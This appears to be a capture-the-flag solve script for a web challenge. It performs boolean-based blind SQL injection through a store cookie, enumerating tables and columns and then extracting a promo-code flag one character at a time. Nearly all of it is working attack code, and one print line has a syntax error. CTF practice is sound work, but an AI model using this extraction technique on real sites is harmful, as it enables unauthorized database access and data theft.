'''
Black Friday US Cyber Open Season II
Web Challenge
Description: This is the code I used to solve the challenge. This was all written from the top of my head so it is very unreadable. Sorry about that. I haven't tested all the code again, so not sure if it works, since I would comment out code depending on the step I was on to speed up the process. This just gives you an idea about writing your own code to solve it.
'''


import requests as re
import time, os

def get_bool_res(inject):
    got_res = False
    while not got_res:
        cookies = {"ww_store": "{}".format(inject)}
        r = re.get("http://host3.metaproblems.com:5900/", cookies=cookies)
        if "Store not found." not in r.text and "ERROR" not in r.text and "blocked" not in r.text:
            #print(r.text)
            return True
        elif "blocked" in r.text:
            #print("Blocked! Waiting...")
            time.sleep(5)
        elif "ERROR" in r.text:
            print("Error Response on {}!".format(inject))
        else:
            return False

# "stores" table exists. "promos" exists!

#inj = " AND EXISTS (SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = N'w')

# Check tables
tables_to_check = ["stores", "codes", "promos", "promo_code", "promo_codes"]
for t in tables_to_check:
    inj_exists_table = "10 AND EXISTS(SELECT * FROM {})".format(t)
    cookies = {"ww_store": "{}".format(inj_exists_table)}
    r = re.get("http://host3.metaproblems.com:5900/", cookies=cookies)
    if "Store not found." not in r.text and "ERROR" not in r.text:
        print("Good {}".format(t))

# Check promos column names
columns_to_check = ["id", "code", "test", "ID", "name", 
    "Name", "name", "Date", "date", "DATE", "VALUE", "widjawjdao", "promo", 
    "promos", "promocode", "stores", "codes", "promos", "promo_code", "promo_codes",
    "firstname", "first_name", "last", "lastname", "last_name"]
for c in columns_to_check:
    inj_exists_col = "10 AND EXISTS(SELECT {} FROM promos WHERE 1=1)".format(c)
    cookies = {"ww_store": "{}".format(inj_exists_col)}
    r = re.get("http://host3.metaproblems.com:5900/", cookies=cookies)
    if "Store not found." not in r.text and "ERROR" not in r.text:
        print("Good {}".format(c))

# promo_code EXISTS!

# Get length of promo code
for i in range(100):
    inj_len = "10 AND EXISTS(SELECT promo_code FROM promos WHERE LENGTH(promo_code)={} AND SUBSTRING(promo_code, 1,4)='flag')".format(i)
    if get_bool_res(inj_len):
        print("{} length!".format(i)

from string import ascii_letters, digits

print_chars = ascii_letters + digits + "_" + "-" + "{" + "}"

# 6, 8, 32 length
#lengths = [6, 8, 32]
lengths = [32]
found_codes = []
for l in lengths:
    found_curr = ""
    for i in range(1,l+1):
        is_found = False
        print("char {}".format(i))
        for c in print_chars:
            subs = found_curr + c
            inj_first = "10 AND EXISTS(SELECT promo_code FROM promos WHERE LENGTH(promo_code)={} AND SUBSTRING(promo_code, 1, {})='{}')".format(l,i,subs)
            #print(inj_first)
            if get_bool_res(inj_first):
                print("{} char for length {}!".format(c, l))
                found_curr += c
                is_found = True
                break # Don't look for multiple of given length
        if not is_found:
            print("ERORR: char {} not found!!!".format(i))
            os._exit()

    found_codes.append(found_curr)

print(found_codes)
